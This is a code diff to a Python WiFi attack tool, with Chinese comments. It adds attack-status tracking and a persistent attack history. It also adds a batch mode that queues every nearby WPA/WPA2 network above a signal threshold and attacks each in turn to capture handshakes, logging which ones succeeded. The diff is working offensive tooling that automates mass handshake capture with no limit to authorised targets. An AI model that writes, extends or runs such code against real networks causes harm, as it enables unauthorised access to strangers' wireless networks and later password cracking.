@@ -9,10 +9,21 @@ import threading
 from datetime import datetime
 from pathlib import Path
 
+# 攻击状态定义
+ATTACK_STATUS_NONE = 'none'        # 未攻击
+ATTACK_STATUS_QUEUED = 'queued'    # 排队中
+ATTACK_STATUS_ATTACKING = 'attacking'  # 攻击中
+ATTACK_STATUS_CAPTURED = 'captured'    # 已捕获
+ATTACK_STATUS_FAILED = 'failed'        # 失败
+ATTACK_STATUS_SKIPPED = 'skipped'      # 跳过
+
 class WiFiScanner:
     def __init__(self, capture_dir="/opt/wifi-capture/captures"):
         self.capture_dir = Path(capture_dir)
         self.capture_dir.mkdir(parents=True, exist_ok=True)
+        self.data_dir = Path("/opt/wifi-capture/data")
+        self.data_dir.mkdir(parents=True, exist_ok=True)
+        self.attack_history_file = self.data_dir / "attack_history.json"
         self.interface = None
         self.mon_interface = None
         self.scan_process = None
@@ -29,6 +40,19 @@ class WiFiScanner:
         self.hidden_ssid_cache = {}  # BSSID -> SSID 映射 (用于隐藏网络)
         self.probe_listener_process = None
         self.probe_listener_running = False
+        
+        # 批量捕获相关
+        self.is_auto_capturing = False
+        self.auto_capture_thread = None
+        self.auto_capture_queue = []  # 待攻击队列
+        self.auto_capture_progress = {  # 批量捕获进度
+            'total': 0,
+            'completed': 0,
+            'captured': 0,
+            'failed': 0,
+            'current_target': None
+        }
+        self.attack_history = self._load_attack_history()  # BSSID -> 攻击记录
         
     def find_interface(self):
         """查找无线网卡"""
@@ -217,10 +241,26 @@ class WiFiScanner:
             print(f"Error parsing scan results: {e}")
     
     def get_networks(self):
-        """获取扫描到的网络列表"""
+        """获取扫描到的网络列表（包含攻击状态）"""
         if self.is_scanning:
             self._parse_scan_results()
-        return self.networks
+        
+        # 为每个网络添加攻击状态
+        networks_with_status = []
+        for net in self.networks:
+            net_copy = dict(net)
+            bssid = net_copy['bssid'].upper()
+            net_copy['attack_status'] = self.get_network_attack_status(bssid)
+            
+            # 如果有攻击历史，添加更多信息
+            if bssid in self.attack_history:
+                hist = self.attack_history[bssid]
+                net_copy['attack_time'] = hist.get('timestamp')
+                net_copy['has_handshake'] = hist.get('handshake', False)
+            
+            networks_with_status.append(net_copy)
+        
+        return networks_with_status
     
     def start_capture(self, bssid, channel, essid):
         """开始捕获握手包 - 带自动攻击"""
@@ -763,6 +803,205 @@ class WiFiScanner:
                          capture_output=True, timeout=10)
         except:
             pass
+
+
+    # ==================== 攻击历史管理 ====================
+    
+    def _load_attack_history(self):
+        """从文件加载攻击历史"""
+        try:
+            if self.attack_history_file.exists():
+                with open(self.attack_history_file, 'r', encoding='utf-8') as f:
+                    return json.load(f)
+        except Exception as e:
+            print(f"Error loading attack history: {e}")
+        return {}
+    
+    def _save_attack_history(self):
+        """保存攻击历史到文件"""
+        try:
+            with open(self.attack_history_file, 'w', encoding='utf-8') as f:
+                json.dump(self.attack_history, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            print(f"Error saving attack history: {e}")
+    
+    def get_attack_history(self):
+        """获取攻击历史"""
+        return dict(self.attack_history)
+    
+    def clear_attack_history(self):
+        """清除攻击历史"""
+        self.attack_history = {}
+        self._save_attack_history()
+    
+    def _record_attack(self, bssid, essid, status, handshake=False, capture_file=None):
+        """记录攻击结果"""
+        self.attack_history[bssid.upper()] = {
+            'bssid': bssid.upper(),
+            'essid': essid,
+            'status': status,
+            'handshake': handshake,
+            'capture_file': capture_file,
+            'timestamp': datetime.now().isoformat()
+        }
+        self._save_attack_history()
+    
+    def get_network_attack_status(self, bssid):
+        """获取网络的攻击状态"""
+        bssid = bssid.upper()
+        if bssid in self.attack_history:
+            return self.attack_history[bssid]['status']
+        return ATTACK_STATUS_NONE
+    
+    # ==================== 批量自动捕获 ====================
+    
+    def start_auto_capture_all(self, skip_attacked=True, min_power=-80):
+        """开始自动批量捕获所有 WPA/WPA2 网络"""
+        if self.is_auto_capturing or self.is_capturing:
+            return False
+        
+        if not self.mon_interface:
+            if not self.enable_monitor_mode():
+                return False
+        
+        # 筛选目标网络
+        targets = []
+        for network in self.networks:
+            bssid = network['bssid'].upper()
+            
+            # 跳过非 WPA/WPA2 网络
+            enc = network.get('encryption', '')
+            if not ('WPA' in enc or 'WPA2' in enc):
+                continue
+            
+            # 跳过信号太弱的
+            if network.get('power', -100) < min_power:
+                continue
+            
+            # 跳过已攻击成功的
+            if skip_attacked and bssid in self.attack_history:
+                hist = self.attack_history[bssid]
+                if hist.get('status') == ATTACK_STATUS_CAPTURED:
+                    continue
+            
+            targets.append(network)
+        
+        if not targets:
+            return False
+        
+        # 按信号强度排序
+        targets.sort(key=lambda x: x.get('power', -100), reverse=True)
+        
+        self.auto_capture_queue = targets
+        self.is_auto_capturing = True
+        self.auto_capture_progress = {
+            'total': len(targets),
+            'completed': 0,
+            'captured': 0,
+            'failed': 0,
+            'current_target': None
+        }
+        
+        # 标记所有目标为排队状态
+        for t in targets:
+            bssid = t['bssid'].upper()
+            if bssid not in self.attack_history or self.attack_history[bssid]['status'] != ATTACK_STATUS_CAPTURED:
+                self._record_attack(bssid, t.get('essid', 'Unknown'), ATTACK_STATUS_QUEUED)
+        
+        # 启动批量捕获线程
+        self.auto_capture_thread = threading.Thread(
+            target=self._auto_capture_worker,
+            daemon=True
+        )
+        self.auto_capture_thread.start()
+        
+        print(f"[*] 开始批量捕获，共 {len(targets)} 个目标")
+        return True
+    
+    def stop_auto_capture_all(self):
+        """停止批量捕获"""
+        self.is_auto_capturing = False
+        self.stop_capture()  # 停止当前捕获
+        
+        # 将排队中的标记为跳过
+        for bssid, hist in self.attack_history.items():
+            if hist.get('status') == ATTACK_STATUS_QUEUED:
+                self._record_attack(bssid, hist.get('essid', ''), ATTACK_STATUS_SKIPPED)
+        
+        self.auto_capture_queue = []
+        print("[*] 批量捕获已停止")
+    
+    def _auto_capture_worker(self):
+        """批量捕获工作线程"""
+        capture_timeout = 90  # 每个网络最多捕获 90 秒
+        
+        while self.is_auto_capturing and self.auto_capture_queue:
+            # 取出下一个目标
+            target = self.auto_capture_queue.pop(0)
+            bssid = target['bssid']
+            channel = target['channel']
+            essid = target.get('essid', 'Unknown')
+            
+            self.auto_capture_progress['current_target'] = {
+                'bssid': bssid,
+                'essid': essid,
+                'channel': channel
+            }
+            
+            # 标记为攻击中
+            self._record_attack(bssid, essid, ATTACK_STATUS_ATTACKING)
+            
+            print(f"\n[*] 批量捕获: {essid} ({bssid}) CH:{channel}")
+            
+            # 开始捕获
+            if self.start_capture(bssid, channel, essid):
+                # 等待捕获完成或超时
+                start_time = time.time()
+                while self.is_capturing and self.is_auto_capturing:
+                    time.sleep(2)
+                    
+                    # 检查是否已捕获到握手包
+                    if self.current_target and self.current_target.get('handshake'):
+                        print(f"[+] 批量捕获成功: {essid}")
+                        self._record_attack(bssid, essid, ATTACK_STATUS_CAPTURED, 
+                                          handshake=True, 
+                                          capture_file=self.current_target.get('file'))
+                        self.auto_capture_progress['captured'] += 1
+                        break
+                    
+                    # 检查超时
+                    if time.time() - start_time > capture_timeout:
+                        print(f"[-] 批量捕获超时: {essid}")
+                        self.stop_capture()
+                        self._record_attack(bssid, essid, ATTACK_STATUS_FAILED)
+                        self.auto_capture_progress['failed'] += 1
+                        break
+                
+                # 如果捕获被外部停止
+                if self.is_capturing:
+                    self.stop_capture()
+            else:
+                self._record_attack(bssid, essid, ATTACK_STATUS_FAILED)
+                self.auto_capture_progress['failed'] += 1
+            
+            self.auto_capture_progress['completed'] += 1
+            
+            # 短暂间隔
+            if self.is_auto_capturing:
+                time.sleep(3)
+        
+        # 完成
+        self.is_auto_capturing = False
+        self.auto_capture_progress['current_target'] = None
+        print(f"\n[*] 批量捕获完成: 成功 {self.auto_capture_progress['captured']}, 失败 {self.auto_capture_progress['failed']}")
+    
+    def get_auto_capture_status(self):
+        """获取批量捕获状态"""
+        return {
+            'is_running': self.is_auto_capturing,
+            'progress': self.auto_capture_progress,
+            'queue_length': len(self.auto_capture_queue)
+        }
 
 
 # 全局实例
